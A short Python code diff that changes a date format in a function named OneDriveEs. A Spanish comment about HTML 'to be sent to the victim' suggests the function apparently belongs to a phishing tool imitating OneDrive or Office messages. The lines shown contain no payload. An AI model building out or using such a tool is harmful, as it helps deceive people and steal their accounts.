@@ -16,7 +16,7 @@ def OneDriveEs():
     randomCode=random.randint(100000,999999)
     
     date=time.localtime()
-    currentDate=time.strftime("%H:%M:%S , %",date)
+    currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
     
     ##HTML que se enviara a la victima
     officeHtml=("""
